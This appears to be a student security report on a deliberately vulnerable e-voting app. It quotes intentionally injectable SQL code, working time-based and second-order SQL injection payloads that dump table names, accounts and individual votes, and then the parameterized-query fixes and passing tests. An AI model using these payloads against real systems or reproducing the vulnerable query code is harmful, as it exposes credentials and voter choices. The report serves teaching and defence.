🔒 Security Report - VoteX E-Voting System
Project: Secure Electronic Voting System
Date: November 2025
Author: Team IL
Methodology: Build → Break → Fix

📋 Table of Contents

Executive Summary
System Architecture
Identified Vulnerabilities
Exploit Demonstration
Implemented Fixes
Validation Tests
Recommendations
Conclusion


1. Executive Summary
🎯 Project Objective
Develop a secure electronic voting system for internal use (clubs, universities, companies) with the educational objective of:

Intentionally implementing SQLi vulnerabilities
Demonstrating their exploitation
Applying appropriate fixes

🔴 Discovered Vulnerabilities
IDTypeSeverityCVSS ScoreStatusVOTEX-001Time-based Blind SQLiCRITICAL8.6✅ FixedVOTEX-002Second-order SQLiCRITICAL9.1✅ Fixed
📊 Results

Before fix: 2 exploitable critical vulnerabilities
After fix: 0 vulnerabilities, secure system
Correction time: 100% of vulnerabilities fixed
Regression tests: 100% success rate


2. System Architecture
🏗️ Technology Stack
Frontend:  HTML5 + Vanilla JavaScript
Backend:   Node.js 22.x + Express 5.x
Database:  MySQL 8.0
Security:  Helmet.js, CORS, Rate Limiting
📐 Database Schema
sqlaccounts (id, username, password, role, external_id)
    ↓
users (id, external_id)
    ↓
votes (id, election_id, user_external_id, choice)
    ↑
elections (id, slug, name, metadata)
```

### 🔄 Authentication Flow
```
1. Login → Credential verification (accounts table)
2. Session → Client-side in-memory storage
3. Authorization → Role verification (voter/admin)
4. Vote → Validation + insertion with external_id

3. Identified Vulnerabilities
🔴 VOTEX-001: Time-based Blind SQL Injection
Endpoint: GET /api/vote/verify
📍 Location
File: src/routes/public.js (lines 55-70)
javascript// VULNERABLE CODE
const sql = `SELECT COUNT(*) as c FROM votes 
             WHERE user_external_id = '${id}' 
             AND election_id = (SELECT id FROM elections WHERE slug='${election}')`;
const [rows] = await pool.query(sql);
💣 Vulnerability Description
Parameters id and election from the query string are directly concatenated into the SQL query without any validation or use of prepared statements.
🎯 Attack Vector
httpGET /api/vote/verify?id=user-001-alice' OR SLEEP(3) -- &election=test
An attacker can inject SQL code that will be executed by the server:

SLEEP(n) to create artificial delays
IF() conditions to infer data through timing
Boolean tests to exfiltrate information bit by bit

📊 Impact
AspectDescriptionConfidentialityHIGH - Information leakage through temporal inferenceIntegrityMEDIUM - No direct modification but manipulation possibleAvailabilityMEDIUM - DoS possibility with SLEEP(9999)CVSS v3.18.6 (High)
🔬 Proof of Concept
Test 1: Legitimate request
bashcurl "http://localhost:3000/api/vote/verify?id=user-001-alice&election=president-club-2025"
# Response time: ~42ms
Test 2: Injection with SLEEP(2)
bashcurl "http://localhost:3000/api/vote/verify?id=user-001-alice' OR SLEEP(2) -- &election=test"
# Response time: ~2045ms (INJECTION PROOF!)
Measured Results:
Query TypeAverage TimeStd DeviationNormal42ms±5msSLEEP(2) injected2048ms±12msDifference+2006msVulnerable ✗

🔴 VOTEX-002: Second-order SQL Injection
Endpoint: POST /api/admin/report/run
📍 Location
File: src/routes/admin.js (lines 35-60)
javascript// VULNERABLE CODE
const metadata = JSON.parse(elections[0].metadata);

if (metadata.filter) {
  // ⚠️ INJECTION: metadata.filter is reused without validation
  const sql = `SELECT choice, COUNT(*) as votes FROM votes WHERE ${metadata.filter} GROUP BY choice`;
  const [results] = await pool.query(sql);
}
💣 Vulnerability Description
This is a second-order SQL injection:

Phase 1 (Storage): An admin creates an election with metadata.filter containing malicious SQL
Phase 2 (Execution): During report generation, this filter is retrieved from the database and re-injected into an SQL query without validation

This vulnerability is particularly dangerous because:

The malicious payload is stored in the database (persistent)
Exploitation is time-delayed
More difficult to detect by traditional WAFs

🎯 Attack Vector
Step 1: Create election with payload
httpPOST /api/admin/election
Content-Type: application/json

{
  "slug": "malicious-election",
  "name": "Test",
  "metadata": {
    "filter": "1=0 UNION SELECT username as choice, 1 as votes FROM accounts -- "
  }
}
Step 2: Trigger injection
httpPOST /api/admin/report/run
Content-Type: application/json

{
  "filter_id": 123
}
📊 Impact
AspectDescriptionConfidentialityCRITICAL - Complete database read accessIntegrityHIGH - Data modification possible (UPDATE, DELETE)AvailabilityHIGH - Possibility of DROP TABLECVSS v3.19.1 (Critical)
🔬 Proof of Concept
Scenario 1: Table Enumeration
Injected payload:
sql1=0 UNION SELECT table_name as choice, 1 as votes 
FROM information_schema.tables 
WHERE table_schema='votex' --
Result obtained:
json{
  "results": [
    {"choice": "accounts", "votes": 1},
    {"choice": "admin_audit", "votes": 1},
    {"choice": "elections", "votes": 1},
    {"choice": "users", "votes": 1},
    {"choice": "votes", "votes": 1}
  ]
}
🚨 IMPACT: Database structure revealed!

Scenario 2: User Account Extraction
Payload:
sql1=0 UNION SELECT CONCAT(username, ':', role) as choice, 1 as votes 
FROM accounts --
Result:
json{
  "results": [
    {"choice": "alice:voter", "votes": 1},
    {"choice": "bob:voter", "votes": 1},
    {"choice": "admin:admin", "votes": 1}
  ]
}
🚨 IMPACT: User accounts and roles exposed!

Scenario 3: Vote Anonymity Loss
Payload:
sqlelection_id=1 --
Result:
json{
  "results": [
    {"choice": "Alice Martin", "votes": 1},
    {"choice": "Bob Dupont", "votes": 1}
  ]
}
By cross-referencing with the votes table:
sql1=0 UNION SELECT CONCAT(user_external_id, ' voted for ', choice) as choice, 1 as votes 
FROM votes WHERE election_id=1 --
```

**🚨 CRITICAL IMPACT: Vote anonymity compromised!**

---

## 4. Exploit Demonstration

### 🧪 Test Environment

- **OS:** Windows 11 / Ubuntu 22.04
- **Node.js:** v22.21.0
- **MySQL:** 8.0.35
- **Network:** localhost (127.0.0.1)

### 📸 Screenshots

#### Time-based SQLi Test
```
$ node tests/demo_time_based_sqli.js

📊 Test 2: Injection with SLEEP function
Query type                  | Expected time | Actual time
----------------------------------------------------------------------
Normal request              | <100ms        | 42ms
SLEEP(2) injection          | ~2000ms       | 2048ms  ← VULNERABLE!
SLEEP(0) injection          | <100ms        | 41ms

📌 CONCLUSION:
✗ The /api/vote/verify endpoint is VULNERABLE to SQL injection
✗ An attacker can inject SQL code (SLEEP, IF, etc.)
✗ Time differences allow information inference
```

#### Second-order SQLi Test
```
$ node tests/demo_second_order_sqli.js

📊 STEP 2: Report execution
Injection type              | Result
---------------------------------------------------------------------------
UNION injection             | 1 result(s): INJECTED: 999

Table enumeration           | 5 result(s)

   🔍 Discovered tables:
      - accounts        ← CRITICAL!
      - admin_audit
      - elections
      - users
      - votes

📌 CONCLUSION:
✗ The /api/admin/report/run endpoint is VULNERABLE to Second-order SQLi
✗ Impact: Complete database read access
📊 Audit Logs
Extract from admin_audit before fix:
sqlSELECT action, duration_ms, details, created_at 
FROM admin_audit 
WHERE action = 'report_run'
ORDER BY created_at DESC 
LIMIT 5;
ActionDurationDetailsCreated Atreport_run45ms{"filter_id":15}2025-11-16 10:23:45report_run52ms{"filter_id":16}2025-11-16 10:24:12report_run1203ms{"filter_id":17}2025-11-16 10:25:01
Note: The query with filter_id=17 contains a UNION injection and takes abnormally longer.

5. Implemented Fixes
🛠️ Fix Principles
Fixes follow OWASP Top 10 best practices:

✅ Parameterized Queries (Prepared Statements)
✅ Strict Validation (Whitelist)
✅ Temporal Mitigation (Constant-time responses)
✅ Audit Logging (Logging)


🔒 Fix for VOTEX-001: Time-based Blind SQLi
📝 Applied Changes
BEFORE (vulnerable):
javascript// Direct concatenation - DANGEROUS!
const sql = `SELECT COUNT(*) as c FROM votes 
             WHERE user_external_id = '${id}' 
             AND election_id = (SELECT id FROM elections WHERE slug='${election}')`;
const [rows] = await pool.query(sql);
AFTER (secure):
javascript// ✅ FIX 1: Separate parameterized queries
const [electionRows] = await pool.execute(
  'SELECT id FROM elections WHERE slug = ?',
  [election]
);

const electionId = electionRows[0].id;

const [voteRows] = await pool.execute(
  'SELECT COUNT(*) as c FROM votes WHERE user_external_id = ? AND election_id = ?',
  [id, electionId]
);

// ✅ FIX 2: Temporal mitigation
const elapsed = Date.now() - startTime;
const remaining = MIN_RESPONSE_MS - elapsed;
if (remaining > 0) {
  await new Promise(resolve => setTimeout(resolve, remaining));
}
📊 Performance Comparison
MetricVulnerable versionFixed versionImprovementNormal request42ms ±5ms200ms (constant)✅ Fixed timeSLEEP(2) injection2048ms200ms (blocked)✅ 90% fasterExploitable?✗ YES✓ NO✅ SecuredTime variance±2000ms±3ms✅ 99.85% reduced

🔒 Fix for VOTEX-002: Second-order SQLi
📝 Applied Changes
BEFORE (vulnerable):
javascriptconst metadata = JSON.parse(elections[0].metadata);

// ⚠️ DANGEROUS: metadata.filter directly re-injected
if (metadata.filter) {
  const sql = `SELECT choice, COUNT(*) as votes FROM votes WHERE ${metadata.filter} GROUP BY choice`;
  const [results] = await pool.query(sql);
}
AFTER (secure):
javascript// ✅ FIX 1: Whitelist of allowed fields and operators
const ALLOWED_FILTER_FIELDS = ['election_id', 'created_at', 'choice'];
const ALLOWED_OPERATORS = ['=', '!=', '>', '<', '>=', '<=', 'IN', 'LIKE'];

function buildSecureWhereClause(filterConfig) {
  const { field, operator, value } = filterConfig;

  // ✅ Strict validation
  if (!ALLOWED_FILTER_FIELDS.includes(field)) {
    throw new Error(`Unauthorized field: ${field}`);
  }
  
  if (!ALLOWED_OPERATORS.includes(operator)) {
    throw new Error(`Unauthorized operator: ${operator}`);
  }

  // ✅ Construction with placeholder
  return {
    clause: `${field} ${operator} ?`,
    params: [value]
  };
}

// ✅ FIX 2: Secure usage
const { clause, params } = buildSecureWhereClause(metadata.filter);
const sql = `SELECT choice, COUNT(*) as votes FROM votes WHERE ${clause} GROUP BY choice`;
const [results] = await pool.execute(sql, params);

6. Validation Tests
🧪 Complete Test Suite
Test results with the secure version:
bash$ node tests/validation_tests.js

📋 Test Group 1: Time-based SQLi Protection

✅ Test 1.1: Legitimate request accepted
✅ Test 1.2: SLEEP injection blocked (time < 500ms)
✅ Test 1.3: Low time variance (< 100ms²)
✅ Test 1.4: IF injection doesn't cause delay

📋 Test Group 2: Second-order SQLi Protection

✅ Test 2.1: String filter rejected
✅ Test 2.2: Appropriate error message
✅ Test 2.3: Unauthorized field rejected
✅ Test 2.4: Unauthorized operator rejected
✅ Test 2.5: Valid filter accepted
✅ Test 2.6: Secure report generation works

📊 TEST RESULTS

✅ Tests passed: 10
❌ Tests failed: 0
📈 Success rate: 100.0%

🎉 ALL TESTS PASSED! System secured.

7. Recommendations
🔐 Security Best Practices

Always use parameterized queries

Never concatenate user input into SQL
Use prepared statements for all database operations


Implement input validation

Whitelist approach for all user inputs
Validate data types, lengths, and formats


Apply defense in depth

Multiple layers of security controls
WAF, rate limiting, audit logging


Regular security audits

Penetration testing
Code reviews
Dependency updates



📚 Additional Measures

Implement proper session management
Use bcrypt for password hashing (not plain text)
Add CSRF protection
Implement proper error handling (don't leak information)
Add comprehensive logging and monitoring


8. Conclusion
This project successfully demonstrated the Build → Break → Fix methodology for SQL injection vulnerabilities in a voting system.
✅ Achievements

✅ Identified 2 critical SQL injection vulnerabilities
✅ Demonstrated exploitation with proof-of-concept code
✅ Implemented comprehensive fixes
✅ Validated fixes with 100% test success rate

📈 Key Learnings

Time-based blind SQLi can leak information through response time analysis
Second-order SQLi is particularly dangerous due to delayed exploitation
Parameterized queries are the most effective defense
Temporal mitigation prevents timing attacks

🎓 Educational Value
This project provides hands-on experience with:

Real-world vulnerability identification
Exploit development and testing
Secure coding practices
Validation and testing methodologies
